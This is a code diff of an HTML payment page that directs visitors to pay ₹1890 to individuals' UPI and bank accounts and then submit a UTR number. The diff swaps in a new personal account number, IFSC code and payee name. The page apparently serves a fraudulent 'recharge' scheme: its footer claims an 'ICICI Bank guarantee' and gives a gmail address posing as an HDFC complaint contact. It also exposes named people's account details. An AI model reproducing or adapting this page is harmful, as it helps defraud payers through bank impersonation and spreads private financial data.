@@ -18,19 +18,21 @@
     </header>
     <div class="content">
       <div class="info">
-        <p><span>Amount:</span> <align="right"> <strong>₹1890</strong> <button onclick="copyText('1890')">COPY</button> </align> </p>
-        <p><span>VPA/UPI:</span> <align="right"> <strong>jaimatadi1234@indianbank</strong> <button onclick="copyText('jaimatadi1234@indianbank')">COPY</button> </align> </p>
-        <p2><span1>Name:</span1> <strong>Rishpal Singh</strong> </p2> </div>
+              <p><span>Amount:</span> <align="right"> <strong>₹1890</strong> <button onclick="copyText('1890')">COPY</button> </align> </p>
+        <p><span>Account Number:</span> <align="right"> <strong>519110110007808</strong> <button onclick="copyText('519110110007808')">COPY</button> </align> </p>
+            <p><span>IFSC Code:</span> <align="right"> <strong>BKID0005191</strong> <button onclick="copyText('BKID0005191')">COPY</button> </align> </p>
+            <p><span>Name:</span> <align="right"> <strong>AMIT KUMAR NEGI</strong> <button onclick="copyText('AMIT KUMAR NEGI')">COPY</button> </align> </p>
         
+<p><span>Bank Name:</span> <align="right"> <strong>Bank of India</strong> <button onclick="copyText('Bank of India')">COPY</button> </align> </p>
+    </div>
+    
       <label class="section-title">↓ Select payment method and pay ↓</label> 
       <div class="payment-options"> <hr>
       <label><input type="radio" name="payment-method" value="gpay"> <img src="https://i.ibb.co.com/K9cN6NJ/IMG-3882.png" alt="IMG-3882"width="43px" height="20px" style="vertical-align:middle"> </label> <hr>
               <tr>
         <label><input type="radio" name="payment-method" value="phonepe"> <img src="https://i.ibb.co.com/dtpd8d8/IMG-3881.png" alt="IMG-3881" width="79px" height="25px" style="vertical-align:middle"> </label> <hr>
             <tr>
-        <label><input type="radio" name="payment-method" value="paytm"> <img src="https://i.ibb.co.com/1YgNg3b/IMG-3888.png" alt="IMG-3888" width="76px" height="20px" style="vertical-align:middle"> </label> <hr>
-              <tr>
-        <label><input type="radio" name="payment-method" value="upi"> <img src="https://i.ibb.co.com/XZyYVF0/IMG-3880.png" alt="IMG-3880" width="64px" height="20px" style="vertical-align:middle"> </label> <hr> </hr>
+        <label><input type="radio" name="payment-method" value="paytm"> <img src="https://i.ibb.co.com/1YgNg3b/IMG-3888.png" alt="IMG-3888" width="76px" height="20px" style="vertical-align:middle"> </label> <hr> </hr>
         </div>
       <p class="utr-instruction">↓ Fill the UTR numbers after you done payment ↓</p> 
      
@@ -40,7 +42,10 @@
        R <input type="text" id="utr" placeholder="Input UTR number"> </div>
 
       <button class="submit-btn" onclick="submitUTR()">Submit UTR</button>
-      <button class="error-btn" onclick="window.location.href='bank/bank.html'">Pay failed! try bank account</button>
+     
+      <button class="error-btn">Pay failed? Report error</button>
+    </div>
+    
       <left>
         <h6 style="color: lightgray; font-size: 12px;">Dear customers: please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact:</h6> </le> <center> <h6 style= "color:blue;font-size:10px;"> hdfcbankcomplaintacceptance@gmail.com </center>
         </h6>
